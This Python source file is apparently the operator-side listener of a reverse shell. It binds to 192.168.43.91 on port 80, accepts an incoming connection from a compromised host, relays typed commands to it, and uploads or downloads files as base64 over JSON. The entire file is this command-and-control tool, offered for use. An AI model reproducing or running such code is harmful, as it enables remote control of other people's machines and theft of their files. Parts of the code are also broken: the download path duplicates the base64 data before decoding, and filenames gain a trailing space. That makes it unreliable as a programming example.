import socket
import base64
import json
import time
class Listener:
    def net_cheak(self):
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind(("192.168.43.91", 80))
            listener.listen(0)
            print("[+]Listener Start,Waiting for incoming connection!")
            self.connection, address = listener.accept()
            print("[*]Get connection Succssfully" + str(address))
            return self.response()
        except:
            time.sleep(10)
            return self.net_cheak()

    def join_command(self,path):
        value = ''
        for i in range(len(path)):
            try:
                da = path[i + 1]
                value = value + da + ' '
            except IndexError:
                return value

    def box_send(self,command):
        json_data=json.dumps(command)
        self.connection.send(json_data.encode())


    def send(self,command):
        self.box_send(command)
        if command[0]=='exit':
            self.connection.close()
            exit()


    def wirte(self,title,content):
        with open(title,'wb') as file:
            file.write(base64.b64decode(content))
            return "Download successfull!"

    def read(self,file_name):
        with open(file_name,'rb') as file:
            return base64.b64encode(file.read())

    def box_recive(self):
        json_data=''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def response(self):
        while True:
            command = input(":)=>")
            try:
                if command == '':
                    return self.response()
                command = command.split()
                if command[0] == 'upload':
                    file_content = self.read(command[1])
                    command.append(file_content.decode())
                self.send(command)
                result = self.box_recive()
                if command[0] == 'download':
                    write_value = result
                    write_value += write_value
                    title=self.join_command(command)
                    result = self.wirte(title, write_value)
            except Exception:
                result="[+]Unknown command"
            print(result)




Listener1=Listener()
Listener1.net_cheak()